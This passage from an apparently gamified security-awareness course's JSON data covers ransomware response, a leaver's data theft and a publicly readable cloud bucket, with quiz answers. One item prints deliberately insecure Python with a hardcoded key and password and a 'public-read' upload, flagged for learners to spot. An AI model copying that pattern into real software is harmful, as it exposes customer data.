        "debrief": "The note is designed to rush you and cut you off from help. Paying funds the next attack, and there’s no promise the key will work. Never contact the attackers yourself: leave that to Security and the police.<br><b>Remember:</b> Don’t reply to a ransom note. Disconnect and tell Security.",
        "topic": "response",
        "good": "You saw through every pressure trick in the note.",
        "gap": "Ransom notes are built to rush you and cut you off from help. Never contact the attackers or follow their instructions.",
        "act": "See a ransom note? Don’t reply. Disconnect, and report it from another device."
      },
      {
        "type": "choice",
        "name": "The recovery",
        "task": "What is the safest way to get the Settlement team working again?",
        "options": [
          {
            "id": "share",
            "text": "Restore last night’s backup from the shared drive that every server can reach.",
            "why": "If every server can reach it, the attacker could too. It got locked at 02:05 on Monday."
          },
          {
            "id": "sync",
            "text": "Copy the files back from the team’s cloud sync folder.",
            "why": "A sync folder copies every change within seconds, including the locked files."
          },
          {
            "id": "off",
            "text": "Remove the attacker’s account first, then restore Saturday’s offline backup.",
            "right": true
          },
          {
            "id": "pay",
            "text": "Pay the ransom, since the attackers have promised to send a key.",
            "why": "Paying funds crime, keys often fail, and those who pay get attacked again."
          }
        ],
        "hint": "You need a copy the attacker couldn’t reach, like one kept unplugged. And the attacker must be gone first.",
        "debrief": "Offline backups (copies kept unplugged from the network) are the ones ransomware can’t reach. The attacker had been inside since Friday, so their secret admin account had to go first, or they’d just come back.<br><b>Remember:</b> Get the attacker out first, then restore from a backup they couldn’t touch.",
        "topic": "response",
        "good": "You chose the safe way back: remove the attacker, then restore from offline backups.",
        "gap": "Remove the attacker first, then restore from backups they can’t change, like offline copies.",
        "act": "Ask your team whether important data has a backup kept offline."
      },
      {
        "type": "pick",
        "name": "Who to tell",
        "task": "At 11 AM, Security confirms the attackers got into customer settlement data. Pick the 3 that Kestrel Pay must tell.",
        "items": [
          {
            "id": "certin",
            "text": "CERT-In (India’s cyber emergency team), within 6 hours of noticing the incident",
            "bad": true,
            "why": "Indian rules say incidents like ransomware must be reported to CERT-In within 6 hours."
          },
          {
            "id": "attk",
            "text": "The attackers, to ask them to unlock a few files as proof",
            "why": "Only the police and expert teams deal with attackers, never staff."
          },
          {
            "id": "banks",
            "text": "The bank clients whose settlement data was affected, as their contracts require",
            "bad": true,
            "why": "Bank clients have deadlines in their contracts and must protect their own customers."
          },
          {
            "id": "sms",
            "text": "Every customer by SMS, before Security knows what was taken",
            "why": "Share facts, through the agreed process. Guessing causes panic."
          },
          {
            "id": "rbi",
            "text": "RBI, under its incident-reporting rules for payment companies",
            "bad": true,
            "why": "As a payment company, Kestrel Pay reports cyber incidents to its regulator, RBI."
          },
          {
            "id": "wa",
            "text": "The staff WhatsApp group, so everyone stays updated",
            "why": "That’s how incident details leak. Updates go only through official channels."
          }
        ],
        "hint": "Think about who has a law or a contract saying they must be told quickly.",
        "debrief": "The reporting clock starts when you notice an incident, not when the investigation ends. That’s why calling Security straight away matters so much.<br><b>Remember:</b> Report to Security at once. The legal clock is already ticking.",
        "topic": "reporting",
        "good": "You knew who must be told, and how fast.",
        "gap": "CERT-In within 6 hours, plus RBI and bank clients as required. Never the attackers or social media.",
        "act": "Find out who in your team handles reporting to regulators and clients."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Your screen shows a ransom note. Put these steps in the right order.",
        "steps": [
          {
            "id": "iso",
            "text": "Disconnect the laptop from the network (unplug the cable or turn off Wi-Fi). Don’t switch it off."
          },
          {
            "id": "rep",
            "text": "Report it to IT Security straight away, using another device."
          },
          {
            "id": "evict",
            "text": "Security removes the attacker: disables their fake accounts and resets passwords."
          },
          {
            "id": "rest",
            "text": "Restore systems from clean offline backups, and watch in case the attacker comes back."
          }
        ],
        "shown": [
          "rest",
          "rep",
          "evict",
          "iso"
        ],
        "hint": "First stop the spread: every second online means more locked files.",
        "debrief": "Disconnecting stops the spread, and keeping the laptop on saves clues held in its memory. Then report, remove the attacker, and only then restore.<br><b>Remember:</b> Disconnect, don’t switch off, and report from another device.",
        "topic": "response",
        "good": "You know the ransomware steps by heart.",
        "gap": "Disconnect, report from another device, let Security remove the attacker, then restore.",
        "act": "Keep the four ransomware steps somewhere you’ll see them every day."
      }
    ],
    "lessons": [
      "Read the whole file name. .exe, .js and “Enable Content” are warning signs.",
      "Attackers wait quietly. Locking the files is the end of the attack, not the start.",
      "Offline backups save the day. Remove the attacker before restoring.",
      "Ransom note? Disconnect, don’t switch off, and report from another device.",
      "Ransom notes are built to rush you and cut you off. Never contact the attackers.",
      "Reporting clocks, like CERT-In’s 6 hours, start when you notice an incident."
    ],
    "decision": {
      "type": "decision",
      "name": "The shutdown",
      "prompt": "It’s 9:20 AM and some laptops are still being locked. A manager shouts: “Switch off every PC now!” What do you do?",
      "options": [
        {
          "id": "iso",
          "text": "Unplug affected machines from the network, keep them on, and follow IT Security.",
          "q": "best",
          "note": "The spread stops, and the clues held in memory are saved."
        },
        {
          "id": "off",
          "text": "Do as the manager says and switch every PC off straight away.",
          "q": "ok",
          "note": "It stops the spread but wipes the clues held in memory, which slows the investigation. +60 seconds."
        },
        {
          "id": "work",
          "text": "Keep working on the laptops that seem fine. It’s IT’s problem.",
          "q": "poor",
          "note": "Laptops still on the network kept spreading the infection. +120 seconds, and a detour."
        }
      ],
      "topic": "response",
      "good": "You stopped the spread and kept the evidence.",
      "gap": "Disconnect from the network but leave machines on. Switching off destroys clues; ignoring it spreads the damage.",
      "act": "Learn the quickest way to take your laptop off the network."
    },
    "detour": {
      "type": "pick",
      "name": "Stop the spread",
      "task": "By 10 AM the shared drive is locked too. Pick the 2 actions that stop the attack spreading further.",
      "items": [
        {
          "id": "net",
          "text": "Disconnect laptops from shared drives and the VPN (remote office link)",
          "bad": true
        },
        {
          "id": "av",
          "text": "Run an antivirus scan on your own laptop and carry on working",
          "why": "A scan won’t stop an attacker who already has admin (full) control."
        },
        {
          "id": "acct",
          "text": "Disable the attacker’s admin account “svc-backup2”",
          "bad": true
        },
        {
          "id": "ren",
          "text": "Rename the locked files back to their old names",
          "why": "Renaming a file doesn’t unlock it."
        }
      ],
      "hint": "Cut the paths the attack travels along, and the account it uses.",
      "debrief": "The spread stopped, but more data now needs restoring than if you’d disconnected earlier.<br><b>Remember:</b> Cut network access and disable the attacker’s account as fast as you can.",
      "topic": "response",
      "good": "You knew how to stop the spread.",
      "gap": "Cut access to shared drives and disable fake accounts. Scanning your laptop or renaming files doesn’t help.",
      "act": "Report any sign of spreading at once, so Security can cut access."
    },
    "track": "core"
  },
  {
    "id": "leaver",
    "title": "The Last Day",
    "company": "Lumen Pay",
    "threat": "Insider risk, leavers’ access, data loss",
    "lede": "Tuesday, 10:30 AM. A rival pitched to your biggest merchant using Lumen Pay’s exact prices, line by line. A sales manager left the company last week.",
    "locks": [
      {
        "type": "pick",
        "name": "The access review",
        "task": "Vikram resigned on 1 September and left on 15 September. This was his access on 14 September. Pick the 3 that should have been removed or limited on the day he resigned.",
        "items": [
          {
            "id": "crm",
            "text": "Can download the whole merchant list from the CRM (customer database)",
            "bad": true,
            "why": "Nobody serving notice needs to download every customer’s details."
          },
          {
            "id": "mail",
            "text": "Company email and calendar"
          },
          {
            "id": "usb",
            "text": "His laptop can copy files to a pen drive (USB storage)",
            "bad": true,
            "why": "Pen drive copying should be off by default, and surely during notice."
          },
          {
            "id": "chat",
            "text": "Team chat"
          },
          {
            "id": "drop",
            "text": "Personal Dropbox and file-sharing websites not blocked on his laptop",
            "bad": true,
            "why": "Personal cloud storage is the easiest way to take company data out."
          },
          {
            "id": "hr",
            "text": "HR portal for exit formalities"
          }
        ],
        "hint": "Ask of each one: could this move a lot of company data out in one go?",
        "debrief": "All three were still open the day before he left. That night, DLP (the tool that watches for company data leaving) did flag something. So when did the pricing sheet leave?<br><b>Remember:</b> Cut risky access on the day someone resigns, not on their last day.",
        "topic": "insider",
        "good": "You knew which access to cut on resignation day.",
        "gap": "Bulk downloads, pen drives and personal cloud storage should be blocked the day someone resigns.",
        "act": "Managers: review a leaver’s access the day they resign, not on their last day."
      },
      {
        "type": "code",
        "name": "The web log",
        "mask": "##:##",
        "answer": "2247",
        "task": "This is Vikram’s web and DLP (data-leak alert) log for 14 September. The pricing sheet was 2.4 MB. Enter the time, from the Time column, when it left the company.",
        "cols": [
          "Time",
          "Activity",
          "File (size)",
          "Result"
        ],
        "rows": [
          [
            "15:10",
            "Saved to company SharePoint (sharepoint.lumenpay.com)",
            "Merchant_Pricing_FY27.xlsx (2.4 MB)",
            "Allowed, company-approved site",
            "ok"
          ],
          [
            "17:30",
            "Emailed to a merchant contact",
            "Product_Brochure.pdf (1.1 MB)",
            "Allowed",
            "ok"
          ],
          [
            "21:58",
            "Copied to a pen drive (USB)",
            "Export_Merchants.csv (6.8 MB)",
            "DLP warning shown, he clicked past it",
            "bad"
          ],
          [
            "22:47",
            "Uploaded to wetransfer.com (public file-sending site)",
            "holiday_photos.zip (2.4 MB)",
            "Allowed, no rule to block it",
            "bad"
          ]
        ],
        "hint": "File names are easy to change. Sizes aren’t. Follow the 2.4 MB file.",
        "debrief": "He renamed it holiday_photos.zip and sent it out at 10:47 PM. The pen drive copy that night took the merchant list too. And a colleague had actually seen something that evening.<br><b>Remember:</b> Renaming a file doesn’t hide it. Never click past a data-leak warning.",
        "topic": "insider",
        "good": "You spotted the renamed file leaving late at night.",
        "gap": "Renamed files and late-night uploads are classic signs of data theft. Ignored DLP warnings need checking.",
        "act": "Report any data-leak (DLP) warning you don’t recognise to Security."
      },
      {
        "type": "choice",
        "name": "The colleague",
        "task": "The evening before his last day, Ananya saw Vikram copying folders to a pen drive. What should she have done?",
        "options": [
          {
            "id": "conf",
            "text": "Go to his desk and ask what he’s doing.",
            "why": "There may be a good reason, it could warn him, and it isn’t her job to investigate."
          },
          {
            "id": "ign",
            "text": "Ignore it. He’s leaving anyway.",
            "why": "The last days are exactly when data walks out."
          },
          {
            "id": "rep",
            "text": "Quietly tell her manager or Security that evening.",
            "right": true
          },
          {
            "id": "grp",
            "text": "Mention it in the team WhatsApp group.",
            "why": "That spreads gossip and warns him, but doesn’t reach anyone who can act."
          }
        ],
        "hint": "Which choice reaches someone who can check it properly, without making a scene?",
        "debrief": "Reporting isn’t accusing. Security can check quietly, and he may have a good reason. Ananya’s instinct was right, but she didn’t tell anyone.<br><b>Remember:</b> See something odd? Tell your manager or Security quietly, the same day.",
        "topic": "insider",
        "good": "You know that reporting isn’t accusing.",
        "gap": "If you see something odd, tell your manager or Security quietly. Don’t confront or gossip.",
        "act": "Report suspicious behaviour quietly to your manager or Security."
      },
      {
        "type": "spot",
        "frame": "mail",
        "name": "The farewell email",
        "task": "Security finds Vikram’s goodbye email to his team. Tap the 4 lines where he says he is taking company data with him.",
        "items": [
          {
            "id": "from",
            "head": "From",
            "html": "Vikram (Sales Manager)"
          },
          {
            "id": "to",
            "head": "To",
            "html": "Sales West team"
          },
          {
            "id": "subj",
            "head": "Subject",
            "html": "Signing off!"
          },
          {
            "id": "thanks",
            "html": "Thanks for four great years, team. I’ll miss our Friday chai."
          },
          {
            "id": "contacts",
            "html": "I’ve kept a copy of my merchant contact sheet so I can stay in touch with everyone.",
            "flag": true,
            "note": "Merchant contacts belong to the company, even if Vikram built the list."
          },
          {
            "id": "models",
            "html": "I’m taking my pricing models with me. I built them, after all.",
            "flag": true,
            "note": "Work done for the company belongs to the company, whoever built it."
          },
          {
            "id": "sent",
            "html": "I forwarded my Sent folder to my Gmail so I have a record of my deals.",
            "flag": true,
            "note": "Once work emails sit in a personal Gmail, Lumen Pay can’t control them."
          },
          {
            "id": "drive",
            "html": "I’ve also copied the proposal templates to my personal Drive, in case anyone needs them.",
            "flag": true,
            "note": "Copying to personal storage is data leaving, whatever the reason."
          },
          {
            "id": "li",
            "html": "Let’s stay in touch on LinkedIn!"
          }
        ],
        "hint": "For each line, ask: is company information going somewhere the company doesn’t control?",
        "debrief": "Client lists, pricing models, work emails and templates made at work belong to the company. Taking them breaks company policy, and Legal can act on it.<br><b>Remember:</b> What you create at work stays at work. Hand it over when you leave.",
        "topic": "data",
        "good": "You knew that work created on the job belongs to the company.",
        "gap": "Client lists, pricing models and work email stay with the company, whoever built them.",
        "act": "When you leave, hand over your files. Never copy company data to personal accounts."
      },
      {
        "type": "pick",
        "name": "The leftovers",
        "task": "HR switched off Vikram’s network ID (his main company login) on his last day. Pick the 2 places where he can still reach company data.",
        "items": [
          {
            "id": "shared",
            "text": "The shared admin password for the merchant portal, used by the whole sales team",
            "bad": true,
            "why": "A shared password doesn’t switch off with one person’s login. Change it when anyone who knew it leaves."
          },
          {
            "id": "badge",
            "text": "His building badge, switched off on his last day",
            "why": "Already switched off."
          },
          {
            "id": "laptop",
            "text": "His laptop, returned to IT on his last day",
            "why": "IT has it now."
          },
          {
            "id": "phone",
            "text": "Company files and emails already downloaded to his personal phone",
            "bad": true,
            "why": "The data stays on his phone unless IT can wipe its work profile (a separate work area)."
          },
          {
            "id": "vpn",
            "text": "His VPN (remote office access), which uses his network ID",
            "why": "Switching off his network ID closed this too."
          },
          {
            "id": "sso",
            "text": "Apps like the CRM that open with his network ID (single sign-on)",
            "why": "With single sign-on, switching off one login closes them all."
          }
        ],
        "hint": "Look for access that doesn’t need his own network ID to work.",
        "debrief": "Shared passwords and personal phones survive when someone leaves. Change shared passwords when anyone who knew them leaves, and keep work data in a work profile IT can wipe.<br><b>Remember:</b> Switching off one login doesn’t close a shared password. Change it.",
        "topic": "identity",
        "good": "You found the access that survives after someone leaves.",
        "gap": "Shared passwords and data on personal phones still work after a login is switched off.",
        "act": "Change shared passwords whenever someone who knew them leaves."
      },
      {
        "type": "order",
        "name": "The fix",
        "task": "Put these steps for someone who is leaving in order, from resignation day to last day.",
        "steps": [
          {
            "id": "hr",
            "text": "HR tells IT and Security on the day someone resigns."
          },
          {
            "id": "cut",
            "text": "Cut back access for the notice period: no bulk downloads, pen drives or personal cloud."
          },
          {
            "id": "mon",
            "text": "Security keeps a close eye on data-leak (DLP) alerts until the last day."
          },
          {
            "id": "off",
            "text": "On the last day: switch off accounts, collect devices, remind them of the NDA (secrecy agreement)."
          }
        ],
        "shown": [
          "off",
          "mon",
          "hr",
          "cut"
        ],
        "hint": "IT can’t cut anyone’s access until someone tells them that person has resigned.",
        "debrief": "Most insider data loss happens in the weeks around resignation. When HR, IT and Security work together from day one, that gap closes.<br><b>Remember:</b> Protection starts on resignation day, not on the last day.",
        "topic": "insider",
        "good": "You know the steps from resignation to last day.",
        "gap": "HR, IT and Security must act together from resignation day.",
        "act": "Make sure HR tells IT and Security the day someone resigns."
      }
    ],
    "lessons": [
      "Access should shrink on resignation day, not on the last day.",
      "Renaming a file doesn’t hide it. Ignored data-leak warnings need checking.",
      "Seeing something odd? Tell your manager or Security quietly. Reporting isn’t accusing.",
      "HR, IT and Security act together on every leaver.",
      "Work you create at your job belongs to the company. It stays when you leave.",
      "When someone leaves, change shared passwords and wipe work data from their phone."
    ],
    "decision": {
      "type": "decision",
      "name": "The next move",
      "prompt": "You now know the pricing sheet went to WeTransfer. Vikram has already left. What do you do first?",
      "options": [
        {
          "id": "sec",
          "text": "Tell Security and Legal, and leave his laptop and logs untouched.",
          "q": "best",
          "note": "The evidence is safe, and the right people are acting."
        },
        {
          "id": "wa",
          "text": "Message Vikram on WhatsApp and ask him to delete the file.",
          "q": "ok",
          "note": "It warns him and proves nothing. Leave contact to Legal. +60 seconds."
        },
        {
          "id": "wipe",
          "text": "Wipe his laptop clean and give it to the next new joiner.",
          "q": "poor",
          "note": "The laptop held the evidence. Now you must find it elsewhere. +120 seconds, and a detour."
        }
      ],
      "topic": "response",
      "good": "You protected the evidence and brought in the right people.",
      "gap": "Keep devices and logs exactly as they are, and bring in Security and Legal. Don’t wipe anything or contact the person.",
      "act": "Never wipe a leaver’s device until Security says so."
    },
    "detour": {
      "type": "pick",
      "name": "Find the evidence",
      "task": "IT wiped the laptop clean yesterday. Pick the 2 places where evidence still exists.",
      "items": [
        {
          "id": "proxy",
          "text": "Website and data-leak (DLP) logs kept on the security servers",
          "bad": true
        },
        {
          "id": "bin",
          "text": "The recycle bin on the wiped laptop",
          "why": "A wipe clears that too."
        },
        {
          "id": "mail",
          "text": "Email and cloud activity records kept by IT",
          "bad": true
        },
        {
          "id": "desk",
          "text": "His old desk drawer"
        }
      ],
      "hint": "Think about records kept on central company systems, not on the laptop itself.",
      "debrief": "The central logs saved the case. Always keep a leaver’s device untouched until Security clears it.<br><b>Remember:</b> Never wipe a leaver’s laptop until Security says it’s OK.",
      "topic": "response",
      "good": "You knew where evidence survives.",
      "gap": "Central logs survive a wiped laptop. Wiping too early destroys everything else on it.",
      "act": "Ask IT to hold leavers’ devices for a set period before giving them out again."
    },
    "track": "core"
  },
  {
    "id": "cloud",
    "title": "The Open Bucket",
    "company": "Corvid Pay",
    "threat": "Cloud storage left open, keys and passwords in code",
    "lede": "Wednesday, 8:10 AM. A security researcher emails: “Anyone on the internet can read your UPI payment logs.” She’s right: a storage bucket (an online folder in the cloud) was left open.",
    "locks": [
      {
        "type": "choice",
        "name": "The researcher’s email",
        "task": "8:10 AM. A security researcher emails the support inbox. She says Corvid’s UPI logs (records of every payment) are open to the whole internet, and attaches two sample files as proof. What do you do?",
        "options": [
          {
            "id": "ignore",
            "text": "Ignore it. It’s probably someone just hoping for a reward.",
            "why": "She’s doing you a favour. Ignored reports often get posted publicly, and the data stays open."
          },
          {
            "id": "fwd",
            "text": "Forward it to Security now, and thank her for telling you.",
            "right": true,
            "why": "Security gets the facts fast, and she stays willing to help."
          },
          {
            "id": "legal",
            "text": "Reply that looking at our systems is illegal and we may take legal action.",
            "why": "Threats scare people off reporting. Meanwhile the data stays open."
          },
          {
            "id": "open",
            "text": "Open her sample files yourself to check she’s right before telling anyone.",
            "why": "Files from strangers can be harmful, and checking yourself wastes time. Let Security check."
          }
        ],
        "hint": "Who is the expert at checking this? And how should you treat someone who warned you?",
        "debrief": "Security checked within minutes: the logs really are open to everyone. Next, find out how the code made that happen.<br><b>Remember:</b> A security warning from outside is a gift. Send it to Security at once and thank the sender.",
        "topic": "response",
        "good": "You passed the report to Security fast and kept the researcher on your side.",
        "gap": "Treat outside warnings as a gift. Forward them to Security at once and thank the sender.",
        "act": "Save the Security team’s email and phone number so you can report problems fast."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The code",
        "fileName": "txn_logger.py",
        "task": "This live code saves every UPI payment to the cloud. Tap the 4 risky lines.",
        "items": [
          {
            "id": "imp",
            "html": "import boto3  # Amazon cloud toolkit"
          },
          {
            "id": "key",
            "html": "AWS_KEY = \"AKIA4XR7••••Q2LM\"  # TODO remove",
            "flag": true,
            "note": "A cloud key (like a master password) sits in the code. Anyone who sees the code can use it."
          },
          {
            "id": "pw",
            "html": "DB_PASSWORD = \"Corvid@123\"  # database password",
            "flag": true,
            "note": "An easy-to-guess password typed into the code, where anyone can read it."
          },
          {
            "id": "cli",
            "html": "s3 = boto3.client(\"s3\", \"ap-south-1\")  # connect to storage in Mumbai"
          },
          {
            "id": "def",
            "html": "def save_txn(t):  # save one payment"
          },
          {
            "id": "rec",
            "html": "    rec = f\"{t.time},{t.upi_id},{t.mobile},{t.amount}\"",
            "flag": true,
            "note": "It saves customers’ full UPI IDs and mobile numbers, when most digits should be hidden."
          },
          {
            "id": "put",
            "html": "    s3.put_object(Bucket=\"corvid-txn-logs\", Key=t.id, Body=rec,  # upload"
          },
          {
            "id": "acl",
            "html": "                  ACL=\"public-read\")",
            "flag": true,
            "note": "“public-read” lets anyone on the internet open every saved file."
          },
          {
            "id": "ret",
            "html": "    return True"
          }
        ],
        "hint": "Look for a key, a password, customer details, and the setting for who can read the files.",
        "debrief": "The code saved every file as public. But the whole bucket (the online folder) was opened up too. When did that happen?<br><b>Remember:</b> Never put keys or passwords in code. Anyone who can see the code can use them.",
        "topic": "secrets",
        "good": "You found the key, the password, the customer details and the public setting.",
        "gap": "Keys and passwords never go in code, and customer data is never made public.",
        "act": "Keep passwords and keys in the approved vault, never in code, chats or documents."
      },
      {
        "type": "code",
        "name": "The activity log",
        "mask": "##:##",
        "answer": "1638",
        "task": "This activity log records every change made to the bucket (online folder) on Tuesday. Enter the time it was opened to everyone.",
        "cols": [
          "Time",
          "Who",
          "Action",
          "Detail"
        ],
        "rows": [
          [
            "10:02",
            "Auto-release system",
            "Created the bucket",
            "Name: corvid-txn-logs",
            "ok"
          ],
          [
            "10:05",
            "Auto-release system",
            "Set who can read it",
            "Only the Corvid app can read",
            "ok"
          ],
          [
            "16:38",
            "Intern developer’s key",
            "Changed who can read it",
            "Who can read: “*” (everyone)",
            "bad"
          ],
          [
            "16:40",
            "Intern developer’s key",
            "Changed the safety lock",
            "“Block public access” switch: OFF",
            "bad"
          ],
          [
            "Wed 03:12",
            "Unknown outsider (no login)",
            "Listed all files, downloaded ×1,842",
            "Connected from outside India",
            "bad"
          ]
        ],
        "hint": "“*” means everyone. Find when reading was opened to “*”. The safety lock only went off after.",
        "debrief": "A developer opened the bucket to everyone “just to test” at 4:38 PM, then forgot. Overnight, a stranger found it and downloaded 1,842 files. Time to close it properly.<br><b>Remember:</b> “Public” in the cloud means anyone on earth. Never open it up “just to test”.",
        "topic": "cloud",
        "good": "You read the activity log and found the moment it went public.",
        "gap": "Quick “just to test” changes get forgotten. Keep public access blocked.",
        "act": "Get an approved change request before turning off public-access blocking, even briefly."
      },
      {
        "type": "pick",
        "name": "The fix",
        "task": "Pick the 3 actions that really close the hole, not just hide it.",
        "items": [
          {
            "id": "bpa",
            "text": "Turn the “Block public access” lock back on, for the bucket and the whole account.",
            "bad": true
          },
          {
            "id": "rename",
            "text": "Rename the bucket (online folder) so it’s harder for outsiders to find.",
            "why": "A new name locks nothing. Files already found can still be copied."
          },
          {
            "id": "rot",
            "text": "Cancel the leaked cloud key and issue a new one.",
            "bad": true
          },
          {
            "id": "del",
            "text": "Delete the code change that contains the key.",
            "why": "The code’s history and copies still hold it. A leaked key must be cancelled."
          },
          {
            "id": "vault",
            "text": "Move all keys and passwords out of code into a secure vault.",
            "bad": true
          },
          {
            "id": "quiet",
            "text": "Ask the researcher to keep it quiet for now.",
            "why": "Keeping quiet fixes nothing. Thank her and work with her instead."
          }
        ],
        "hint": "Hiding isn’t fixing. What makes the open bucket and the leaked key useless?",
        "debrief": "Public access is blocked, the old key is cancelled and passwords are in the vault. Now handle the incident itself.<br><b>Remember:</b> A leaked key is never safe again. Cancel it; deleting it from the code isn’t enough.",
        "topic": "cloud",
        "good": "You picked the fixes that really close the hole.",
        "gap": "Block public access, cancel leaked keys and move passwords to a vault. Renaming and deleting code don’t help.",
        "act": "Change any password or key that has ever sat in code or a chat; don’t just delete it."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Put the response steps in order, from first to last.",
        "steps": [
          {
            "id": "rep",
            "text": "Tell the Security team and thank the researcher."
          },
          {
            "id": "block",
            "text": "Lock the bucket (online folder) so the public can’t open it."
          },
          {
            "id": "key",
            "text": "Cancel the leaked key and swap in a new one."
          },
          {
            "id": "logs",
            "text": "Check the access records to see exactly what was downloaded."
          }
        ],
        "shown": [
          "logs",
          "key",
          "rep",
          "block"
        ],
        "hint": "Security first. Then shut the door anyone online can walk through, then the key only one attacker might hold.",
        "debrief": "At the same time, Security informs the right people. CERT-In (India’s national cyber security agency) expects incidents reported within 6 hours, and bank clients have their own deadlines in their contracts.<br><b>Remember:</b> Report cloud leaks to Security straight away. The 6-hour CERT-In clock starts early.",
        "topic": "reporting",
        "good": "You put the cloud incident steps in the right order.",
        "gap": "Report, lock the bucket, cancel the key, then check what was taken. CERT-In’s 6-hour clock starts early.",
        "act": "Report anything left open online to Security straight away."
      },
      {
        "type": "choice",
        "name": "The test data",
        "task": "Why did this happen? The developer wanted “realistic data” to test the new code. What should they have used?",
        "options": [
          {
            "id": "copy",
            "text": "A copy of last month’s real customer records, deleted after testing.",
            "why": "Real customer data in a test system can leak, even for a short time."
          },
          {
            "id": "synth",
            "text": "Made-up records, or real ones with all personal details hidden.",
            "right": true,
            "why": "Tests work just as well, and a leak exposes no one."
          },
          {
            "id": "priv",
            "text": "Real customer data, as long as the test bucket stays private.",
            "why": "Test setups change often and get opened “just to test”, just like this one."
          },
          {
            "id": "staff",
            "text": "Real details from colleagues who agree to share them.",
            "why": "It’s still real personal data, now in a less protected place."
          }
        ],
        "hint": "Imagine this test data leaked tomorrow. Which choice would harm no real person?",
        "debrief": "Made-up or masked data (personal details hidden) keeps tests realistic without putting real people at risk. Real customer data stays in the live system.<br><b>Remember:</b> Test with made-up or masked data, never real customer data.",
        "topic": "data",
        "good": "You chose test data that puts no one at risk.",
        "gap": "Test with made-up or masked data. Real customer data never belongs in test systems.",
        "act": "Ask for made-up or masked data before you build or test anything."
      }
    ],
    "lessons": [
      "Never put keys or passwords in code.",
      "“Public” in the cloud means anyone on earth. “Just to test” shortcuts get forgotten.",
      "A leaked key is never safe again. Cancel it; don’t just delete it from the code.",
      "Report anything left open in the cloud to Security at once. CERT-In’s 6-hour clock starts early.",
      "Thank people who report problems, and pass their reports to Security at once.",
      "Test with made-up or masked data, never real customer data."
    ],
    "decision": {
      "type": "decision",
      "name": "The quick fix",
      "prompt": "It’s 8:40 AM and the bucket (online folder) is still open to everyone. Your manager says: “Just delete the whole bucket.” What do you do?",
      "options": [
        {
          "id": "block",
          "text": "Lock it from the public now, and keep the bucket and records as evidence.",
          "q": "best",
          "note": "The leak is closed and the evidence is safe."
        },
        {
          "id": "later",
          "text": "Make it private, and tell Security after the morning team meeting.",
          "q": "ok",
          "note": "Security needed to know at once, because the reporting clock is already running. +60 seconds."
        },
        {
          "id": "del",
          "text": "Delete the bucket and its records so the problem disappears.",
          "q": "poor",
          "note": "The access records were deleted too. Now you must find out what leaked another way. +120 seconds, and a detour."
        }
      ],
      "topic": "cloud",
      "good": "You closed the hole and kept the evidence.",
      "gap": "Lock out the public, but keep the bucket and its records. Deleting destroys evidence.",
      "act": "Stop the leak first, but never delete evidence."
    },
    "detour": {
      "type": "pick",
      "name": "Rebuild the picture",
      "task": "Deleting the bucket (online folder) wiped its records too. Pick the 2 places that can still show who downloaded data.",
      "items": [
        {
          "id": "trail",
          "text": "The cloud activity log, if download tracking was on",
          "bad": true
        },
        {
          "id": "hist",
          "text": "The developer’s web browser history on their laptop"
        },
        {
          "id": "access",
          "text": "Download records saved in a separate logging bucket",
          "bad": true
        },
        {
          "id": "sig",
          "text": "The researcher’s email, including her signature"
        }
      ],
      "hint": "Only records kept somewhere other than the deleted bucket survived.",
      "debrief": "The records kept outside the bucket survived, so you can still see who downloaded what.<br><b>Remember:</b> Keep logs (activity records) separate from the data they track, and never delete evidence.",
      "topic": "response",
      "good": "You knew where the evidence still lives.",
      "gap": "Deleting the bucket deleted its records. Only records kept elsewhere survive.",
      "act": "Check that download tracking is on for any storage holding customer data."
    },
    "track": "core"
  },
  {
    "id": "visitor",
    "title": "The Visitor",
    "company": "Helix Pay",
    "threat": "Tailgating (slipping in behind staff), fake QR codes, office security",
    "lede": "Friday, 9:20 AM. IT finds a small unknown device plugged into a network socket (where office cables connect) behind the 3rd-floor printer. Nobody knows who put it there.",
    "locks": [
      {
        "type": "choice",
        "name": "The phone call",
        "task": "Wednesday, 4 PM. Reception gets a call: “Hi, this is CoolAir. Your facilities manager booked an AC service on floor 3 for tomorrow at 2. Please put our technician on the visitor list.” What should reception do?",
        "options": [
          {
            "id": "add",
            "text": "Add him. The caller knew the manager’s name and the floor, so it sounds real.",
            "why": "Anyone can find names and floors online. Knowing them proves nothing."
          },
          {
            "id": "cb",
            "text": "Take the caller’s number and call it back to confirm the booking.",
            "why": "That number belongs to the caller, so you just reach the same person again."
          },
          {
            "id": "dir",
            "text": "Call the facilities manager on the company directory number to confirm.",
            "right": true,
            "why": "You checked using a number you already trust, not one the caller gave you."
          },
          {
            "id": "mail",
            "text": "Ask CoolAir to email the work order, and add him once it arrives.",
            "why": "An email is as easy to fake as a phone call."
          }
        ],
        "hint": "Pick the check that uses contact details the caller didn’t give you.",
        "debrief": "Knowing names proves nothing, but reception added him without checking. On Thursday afternoon, a man in a CoolAir uniform walked in. Here’s what CCTV saw.<br><b>Remember:</b> Confirm unexpected visits with the host, using a number you already know.",
        "topic": "social",
        "good": "You checked the visit through a contact you trust.",
        "gap": "Callers can easily know names and floors. Confirm with the host through the company directory, not the caller’s number.",
        "act": "Confirm unexpected visits with the employee being visited before adding anyone to the list."
      },
      {
        "type": "pick",
        "name": "The CCTV",
        "task": "CCTV shows these moments from Thursday afternoon. Pick the 3 that helped the stranger get in and move around.",
        "items": [
          {
            "id": "door",
            "text": "Priya held the badge door open for a man in an AC technician’s uniform carrying boxes.",
            "bad": true
          },
          {
            "id": "reg",
            "text": "The visitor signed the visitor book at reception."
          },
          {
            "id": "walk",
            "text": "He walked around floor 3 alone for 25 minutes. Nobody went with him.",
            "bad": true
          },
          {
            "id": "ask",
            "text": "A colleague asked him which team he was there to see."
          },
          {
            "id": "chair",
            "text": "Someone had propped the printer room door open with a chair.",
            "bad": true
          },
          {
            "id": "lock",
            "text": "Staff locked their screens when they left their desks."
          }
        ],
        "hint": "Which moments undid a protection the office already had, like a locked door?",
        "debrief": "A held door got him in, no escort let him wander, and a propped door gave him a room. Before leaving, he also stuck posters in the pantry. Here’s one.<br><b>Remember:</b> Don’t hold badge doors for strangers, and never leave a visitor alone.",
        "topic": "physical",
        "good": "You spotted every slip that let the stranger in and around.",
        "gap": "Holding badge doors, leaving visitors alone and propping doors open all undo office security.",
        "act": "Keep badge doors shut behind you, and stay with every visitor you bring in."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The poster",
        "task": "Staff found this poster in the pantry. Tap the 4 warning signs that it’s a scam.",
        "items": [
          {
            "id": "hd",
            "html": "<b>HR Benefits Team</b>"
          },
          {
